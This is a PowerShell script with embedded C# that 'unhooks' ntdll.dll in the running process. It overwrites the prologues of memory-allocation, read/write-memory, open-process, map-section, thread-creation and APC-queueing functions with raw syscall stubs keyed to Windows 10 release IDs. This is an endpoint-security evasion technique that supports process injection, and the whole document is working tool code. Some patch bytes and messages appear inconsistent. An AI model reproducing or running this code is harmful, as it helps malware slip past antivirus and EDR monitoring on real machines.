

Function unhookme32 {
    
$win32 = @"
using System.Runtime.InteropServices;
using System;

public class NTDLL
{
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32", EntryPoint = "RtlMoveMemory", SetLastError = false)] static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

    public static string UHookVMemory()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "ZwAllocateVirtualMemory");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find ZwCreateThreadEx";
        }
        Console.WriteLine("Memory location of ZwAllocateVirtualMemory: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0xb8, 0x18, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(5);
        Marshal.Copy(Patch, 0, unmanagedPointer, 5);
        MoveMemory(asbf, unmanagedPointer, 5);
        return "[+] ZwAllocateVirtualMemory Patched";
    }
    public static string UHookOProcess()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "ZwOpenProcess");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find ZwOpenProcess";
        }
        Console.WriteLine("Memory location of ZwAllocateVirtualMemory: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0xb8, 0x26, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(5);
        Marshal.Copy(Patch, 0, unmanagedPointer, 5);
        MoveMemory(asbf, unmanagedPointer, 5);
        return "[+] ZwOpenProcess Patched";
    }  
    public static string UHookRMemory()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "NtReadVirtualMemory");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find NtReadVirtualMemory";
        }
        Console.WriteLine("Memory location of NtReadVirtualMemory: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0x8b, 0x3f, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(5);
        Marshal.Copy(Patch, 0, unmanagedPointer, 5);
        MoveMemory(asbf, unmanagedPointer, 5);
        return "[+] NtReadVirtualMemory Patched";
    }    
    public static string UHookWMemory()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "NtWriteVirtualMemory");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find NtWriteVirtualMemory";
        }
        Console.WriteLine("Memory location of NtWriteVirtualMemory: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0xb8, 0x3a, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(5);
        Marshal.Copy(Patch, 0, unmanagedPointer, 5);
        MoveMemory(asbf, unmanagedPointer, 5);
        return "[+] NtWriteVirtualMemory Patched";
    }      
    public static string UHookMVSection()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "NtMapViewOfSection");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find NtMapViewOfSection";
        }
        Console.WriteLine("Memory location of NtMapViewOfSection: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0xb8, 0x28, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(5);
        Marshal.Copy(Patch, 0, unmanagedPointer, 5);
        MoveMemory(asbf, unmanagedPointer, 5);
        return "[+] NtMapViewOfSection Patched";
    }    
    public static string UHook(byte SysCallID)
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "ZwCreateThreadEx");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find ZwCreateThreadEx";
        }
        Console.WriteLine("Memory location of ZwCreateThreadEx: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0xb8, SysCallID, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(5);
        Marshal.Copy(Patch, 0, unmanagedPointer, 5);
        MoveMemory(asbf, unmanagedPointer, 5);
        return "[+] ZwCreateThreadEx Patched";
    }
}
"@
Add-Type $win32

$releaseid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ReleaseId
if ($releaseid) {
    # SysCall - https://j00ru.vexillium.org/syscalls/nt/64/
    echo "Windows 10 - Release $($releaseid)" 
    echo "Unhooking 32bit process" 
    echo "==========================="
    if ($releaseid -eq 1507){ [byte]$SysCallID = "0xb3"}
    if ($releaseid -eq 1511){ [byte]$SysCallID = "0xb4"}
    if ($releaseid -eq 1607){ [byte]$SysCallID = "0xb6"}
    if ($releaseid -eq 1703){ [byte]$SysCallID = "0xb9"}
    if ($releaseid -eq 1709){ [byte]$SysCallID = "0xba"}
    if ($releaseid -eq 1803){ [byte]$SysCallID = "0xbb"}
    if ($releaseid -eq 1809){ [byte]$SysCallID = "0xbc"}
    if ($releaseid -eq 1903){ [byte]$SysCallID = "0xbd"}
    $sysc = [String]::Format("{0:x}", $SysCallID)
    echo "[>] SysCall ID: 0x$($sysc)"

$r1 = [NTDLL]::UHookVMemory()
echo $r1
$r2 = [NTDLL]::UHookRMemory()
echo $r2
$r3 = [NTDLL]::UHookWMemory()
echo $r3
$r4 = [NTDLL]::UHookOProcess()
echo $r4
$r5 = [NTDLL]::UHookMVSection()
echo $r5
$r6 = [NTDLL]::UHook($SysCallID)
echo $r6

}

}

Function unhookme64 {
    
$win32 = @"
using System.Runtime.InteropServices;
using System;

public class NTDLL
{
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32", EntryPoint = "RtlMoveMemory", SetLastError = false)] static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

    public static string UHookVMemory()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "ZwAllocateVirtualMemory");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find ZwCreateThreadEx";
        }
        Console.WriteLine("Memory location of ZwAllocateVirtualMemory: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0x4c, 0x8b, 0xd1, 0xb8, 0x18, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(8);
        Marshal.Copy(Patch, 0, unmanagedPointer, 8);
        MoveMemory(asbf, unmanagedPointer, 8);
        return "[+] ZwAllocateVirtualMemory Patched";
    }
    public static string UHookOProcess()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "ZwOpenProcess");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find ZwOpenProcess";
        }
        Console.WriteLine("Memory location of ZwAllocateVirtualMemory: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0x4c, 0x8b, 0xd1, 0xb8, 0x26, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(8);
        Marshal.Copy(Patch, 0, unmanagedPointer, 8);
        MoveMemory(asbf, unmanagedPointer, 8);
        return "[+] ZwOpenProcess Patched";
    }  
    public static string UHookRMemory()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "NtReadVirtualMemory");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find NtReadVirtualMemory";
        }
        Console.WriteLine("Memory location of NtReadVirtualMemory: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0x4c, 0x8b, 0xd1, 0xb8, 0x3f, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(8);
        Marshal.Copy(Patch, 0, unmanagedPointer, 8);
        MoveMemory(asbf, unmanagedPointer, 8);
        return "[+] NtReadVirtualMemory Patched";
    }
    public static string UHookWMemory()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "NtWriteVirtualMemory");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find NtWriteVirtualMemory";
        }
        Console.WriteLine("Memory location of NtWriteVirtualMemory: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0x4c, 0x8b, 0xd1, 0xb8, 0x3a, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(8);
        Marshal.Copy(Patch, 0, unmanagedPointer, 8);
        MoveMemory(asbf, unmanagedPointer, 8);
        return "[+] NtWriteVirtualMemory Patched";
    }      
    public static string UHookMVSection()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "NtMapViewOfSection");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find NtMapViewOfSection";
        }
        Console.WriteLine("Memory location of NtMapViewOfSection: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0x4c, 0x8b, 0xd1, 0xb8, 0x28, 0x00, 0x00, 0x00 };       
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(8);
        Marshal.Copy(Patch, 0, unmanagedPointer, 8);
        MoveMemory(asbf, unmanagedPointer, 8);
        return "[+] NtMapViewOfSection Patched";
    }        
    public static string UHook(byte SysCallID)
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "ZwCreateThreadEx");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find ZwCreateThreadEx";
        }
        Console.WriteLine("Memory location of ZwCreateThreadEx: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0x4c, 0x8b, 0xd1, 0xb8, SysCallID, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(8);
        Marshal.Copy(Patch, 0, unmanagedPointer, 8);
        MoveMemory(asbf, unmanagedPointer, 8);
        return "[+] ZwCreateThreadEx Patched";
    }
    public static string UHookQueue()
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, "NtQueueApcThreadEx");
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find NtQueueApcThreadEx";
        }
        Console.WriteLine("Memory location of NtQueueApcThreadEx: "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0x4c, 0x8b, 0xd1, 0xb8, 0x5d, 0x01, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(8);
        Marshal.Copy(Patch, 0, unmanagedPointer, 8);
        MoveMemory(asbf, unmanagedPointer, 8);
        return "[+] NtQueueApcThreadEx Patched";
    }    
    public static string UHooker(byte SysCallID, string APICall)
    {
        IntPtr TargetDLL = LoadLibrary("ntdll.dll");
        if (TargetDLL == IntPtr.Zero)
        {
            return "[-] Error cannot find ntdll.dll";
        }

        IntPtr asbf = GetProcAddress(TargetDLL, APICall);
        if (asbf == IntPtr.Zero)
        {
            return "[-] Error cannot find " + APICall;
        }
        Console.WriteLine("Memory location of "+APICall+": "+asbf.ToString("X8"));
        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
        {
            
            return "[-] Error cannot change memory protection";
        }
        Byte[] Patch = { 0x4c, 0x8b, 0xd1, 0xb8, SysCallID, 0x00, 0x00, 0x00 };        
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(8);
        Marshal.Copy(Patch, 0, unmanagedPointer, 8);
        MoveMemory(asbf, unmanagedPointer, 8);
        return "[+] "+APICall+" Patched";
    }
}
"@
Add-Type $win32

$releaseid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ReleaseId
if ($releaseid) {
    # SysCall - https://j00ru.vexillium.org/syscalls/nt/64/
    echo "Windows 10 - Release $($releaseid)" 
    echo "Unhooking 64bit process" 
    echo "==========================="
    if ($releaseid -eq 1507){ [byte]$SysCallID = "0xb3"}
    if ($releaseid -eq 1511){ [byte]$SysCallID = "0xb4"}
    if ($releaseid -eq 1607){ [byte]$SysCallID = "0xb6"}
    if ($releaseid -eq 1703){ [byte]$SysCallID = "0xb9"}
    if ($releaseid -eq 1709){ [byte]$SysCallID = "0xba"}
    if ($releaseid -eq 1803){ [byte]$SysCallID = "0xbb"}
    if ($releaseid -eq 1809){ [byte]$SysCallID = "0xbc"}
    if ($releaseid -eq 1903){ [byte]$SysCallID = "0xbd"}
    $sysc = [String]::Format("{0:x}", $SysCallID)
    echo "[>] SysCall ID: 0x$($sysc)"

$r1 = [NTDLL]::UHookVMemory()
echo $r1
$r2 = [NTDLL]::UHookRMemory()
echo $r2
$r3 = [NTDLL]::UHookWMemory()
echo $r3
$r4 = [NTDLL]::UHookOProcess()
echo $r4
$r5 = [NTDLL]::UHookMVSection()
echo $r5
$r6 = [NTDLL]::UHook($SysCallID)
echo $r6
$r7 = [NTDLL]::UHookQueue()
echo $r7

# Need to check all system calls for diff versions of windows
#$r = [NTDLL]::UHooker([byte]0x1C, "NtSetInformationProcess")
#echo $r
#$r = [NTDLL]::UHooker([byte]0x2A, "NtUnmapViewOfSection")
#echo $r
#$r = [NTDLL]::UHooker([byte]0xC2, "ZwCreateUserProcess")
#echo $r
#$r = [NTDLL]::UHooker([byte]0xB4, "ZwCreateProcess")
#echo $r
#$r = [NTDLL]::UHooker([byte]0x4D, "NtCreateProcessEx")
#echo $r
#$r = [NTDLL]::UHooker([byte]0x4E, "ZwCreateThread")
#echo $r
#$r = [NTDLL]::UHooker([byte]0x1E, "NtFreeVirtualMemory")
#echo $r
#$r = [NTDLL]::UHooker([byte]0x50, "NtProtectVirtualMemory")
#echo $r
#$r = [NTDLL]::UHooker([byte]0x45, "ZwQueueApcThread")
#echo $r


}

}

Function unhookme
{
    if (Test-Win64) {
        unhookme64
    }
    elseif ((Test-Win32) -and (-Not (Test-Wow64))) {
        unhookme32
    }
    elseif ((Test-Win32) -and (Test-Wow64)) {
        unhookme32
    }
    else {
        Write-Output "Unknown Architecture Detected"
    }
}